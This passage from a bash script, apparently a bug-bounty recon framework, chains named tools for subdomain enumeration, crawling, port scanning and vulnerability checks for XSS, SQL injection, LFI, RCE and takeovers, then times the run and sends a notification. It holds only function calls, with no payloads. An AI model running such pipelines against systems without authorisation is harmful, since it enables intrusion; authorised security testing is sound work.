	# Screenshotting
	# run "GOWITNESS"
	# run "AQUATONE"
	# run "EYEWITNESS"
	# run "HTTPX_SS"


	# Directory Enumeration
	# run "FFUFDIRENUM"
	# run "DIRSEARCH"
	# run "FEROXBUSTER"
	# run "WFUZZ"


	# Email Enumeration
	# run "EMAILFINDER"


	# Url Crawling
	run "WAYMORE"
	run "HAKRAWLER"
	run "WAYBACKURLS"
	run "KATANA"
	run "GAU"
	# run "GOSPIDER"
	run "UFORALL"
	run "URLFINDER"
	run "GITHUB_ENDPOINTS"
	run "XURLFIND3R"
	run "XCRAWL3R"
	run "CRAWLEY"
	run "GOLINKFINDER"
	# run "GALER # Taking too much ram need to be fixed"
	# run "PATHFINDER"
	run "PATHCRAWLER"
	run "ROBOXTRACTOR"
	run "ROBOTXT"


	# Google Dorking
	# run "AUTOMATED_GOOGLE_DORKING"
	# run "MANUAL_GOOGLE_DORKING"


	# JS Crawling
	run "SUBJS"
	run "GETJS"
	run "JSCRAWLER"
	run "JSFINDER"
	# run "JAVASCRIPT_DEOBFUSCATOR"
	# run "LINKFINDER"
	run "XNLINKFINDER"
	# run "GETJSWORDS"
	run "SOURCEMAPPER"
	# run "LINX"
	# run "JSLUICE"


	# Hidden Parameter
	run "PARAMFINDER"
	# run "MSARJUN"
	# run "X8"
	run "ALLURLS"
	run "MANUAL_ALLURLS_FILTER"


	# Delete TMPDIR files
	run "DELETE_TMPDIR"
}

# Run functions based on selected recon mode
if [[ "$RECON_XSS" == true ]]; then
    RECON
    run "XSS"
    run "SWAGGERUI"
elif [[ "$RECON_SQLI" == true ]]; then
    RECON
    run "ERRORBASEDSQLI"
	# run "TIMEBASEDSQLI"
elif [[ "$RECON_LFI" == true ]]; then
    RECON
    run "LFI"
elif [[ "$RECON_SUBTAKEOVER" == true ]]; then
    RECON
    run "SUBZY"
	run "NUCLEI"
elif [[ "$RECON_RCE" == true ]]; then
    RECON
    run "RCE"
elif [[ "$RECON_IIS" == true ]]; then
    RECON
    run "IIS"
else
    # Default behavior: run all
    # Subdomain Enumeration
	run "BUGBOUNTYDATA"
	run "SUBFINDER"
	run "AMASS"
	run "SUBDOG"
	run "FINDOMAIN"
	run "CHAOS"
	run "GITHUB_SUBDOMAINS"
	# run "BBOT"
	run "ONEFORALL"
	run "SHOSUBGO"
	run "ASSETFINDER"
	run "HAKTRAILS"
	# run "HAKTRAILSFREE"


	# Certificate Transperency
	run "CERO"
	run "CERTINFO"
	run "CSPRECON"
	run "CSPFINDER"
	run "ALLSUBDOMAIN"
	# run "RECURSIVESUBENUM"


	# Subdomain Permutations
	# run "ALTDNS"
	# run "PUREDNS"
	# run "ALTERX"
	# run "GOTATOR"
	# run "DNSGEN"
	# run "GOALTDNS"
	# run "RIPGEN"
	# run "DNSCEWL"
	# run "ALLSUBDOMAINPERMUTATIONS"


	# Subdomain Resolving
	# run "PUREDNS"
	# run "SHUFFLEDNS"
	# run "MASSDNS"


	# Subdomain DNS Enumeration
	# run "DNSX"


	# Cloud Recon
	run "KAEFERJAEGER"


	# Port Scanning
	run "NAABU"
	# run "MASSCAN"
	# run "RUSTSCAN"
	# run "NMAP"


	# Subdomain Probing
	run "HTTPX"


	# Subdomain Bruteforcing
	# run "FFUFBRUTE"


	# VHOST Dicovery
	# run "FFUFVHOST"


	# Favicon Lookup
	run "FAVINFO"
	run "FAVIRECON"


	# Screenshotting
	# run "GOWITNESS"
	# run "AQUATONE"
	# run "EYEWITNESS"
	# run "HTTPX_SS"


	# Directory Enumeration
	# run "FFUFDIRENUM"
	# run "DIRSEARCH"
	# run "FEROXBUSTER"
	# run "WFUZZ"


	# Email Enumeration
	# run "EMAILFINDER"


	# Url Crawling
	run "WAYMORE"
	run "HAKRAWLER"
	run "WAYBACKURLS"
	run "KATANA"
	run "GAU"
	# run "GOSPIDER"
	run "UFORALL"
	run "URLFINDER"
	run "GITHUB_ENDPOINTS"
	run "XURLFIND3R"
	run "XCRAWL3R"
	run "CRAWLEY"
	run "GOLINKFINDER"
	# run "GALER # Taking too much ram need to be fixed"
	# run "PATHFINDER"
	run "PATHCRAWLER"
	run "ROBOXTRACTOR"
	run "ROBOTXT"


	# Google Dorking
	# run "AUTOMATED_GOOGLE_DORKING"
	# run "MANUAL_GOOGLE_DORKING"


	# JS Crawling
	run "SUBJS"
	run "GETJS"
	run "JSCRAWLER"
	run "JSFINDER"
	# run "JAVASCRIPT_DEOBFUSCATOR"
	# run "LINKFINDER"
	run "XNLINKFINDER"
	# run "GETJSWORDS"
	run "SOURCEMAPPER"
	# run "LINX"
	# run "JSLUICE"


	# Hidden Parameter
	run "PARAMFINDER"
	# run "MSARJUN"
	# run "X8"
	run "ALLURLS"
	run "MANUAL_ALLURLS_FILTER"


	# Program Based Wordlist Generator
	# run "CEWL"
	# run "UNFURL"
	# run "CUSTOM_PARAM"
	# run "COOK"
	# run "PYDICTOR"


	# run "FFUF_CUSTOM_PARAM"


	# Subdomain Takeover
	run "SUBZY"
	run "NUCLEI"


	# MX Takeover
	run "MXTAKEOVER"

	# DNS takeover
	run "DNSTAKE"

	# Zone Transfer
	# run "DIG"


	# Vulnerability Scanning
	run "FTP"
	# run "SSH"
	run "VULNTECHX"
	# run "XSS"
	run "ERRORBASEDSQLI"
	# run "TIMEBASEDSQLI"
	# run "LFI"
	run "RCE"
	run "DOTGIT"
	run "PDFTOTEXT"
	# run "JSLEAKS"
	# run "JSONLEAKS"
	# run "GITHUBLEAKS"
	run "IIS"
	run "SWAGGERUI"
	# run "403_401_BYPASS"


	# URLs Secrets
	# run "LINKINSPECTOR"


	# Password spraying
	# run "BRUTESPRAY"


	# Delete TMPDIR files
	run "DELETE_TMPDIR"
fi


ENDED_AT=$(date +"%d-%m-%Y_%H:%M:%S")
END_EPOCH=$(date +%s)

DURATION=$(( END_EPOCH - START_EPOCH ))
TIMETOOK=$(printf "%02d:%02d:%02d" $((DURATION/3600)) $(( (DURATION%3600)/60 )) $((DURATION%60)) )

echo -e "${BGREEN}[+] STARTED${RESET}: ${STARTED_AT}, ${BGREEN}FINISHED${RESET}: ${ENDED_AT}, ${BGREEN}TIMETOOK${RESET}: ${TIMETOOK}" | unew -a $RESUMELOGFILE

echo -e "Scan finished: $TARGET" | notify -silent -duc -id xssnotify &>/dev/null
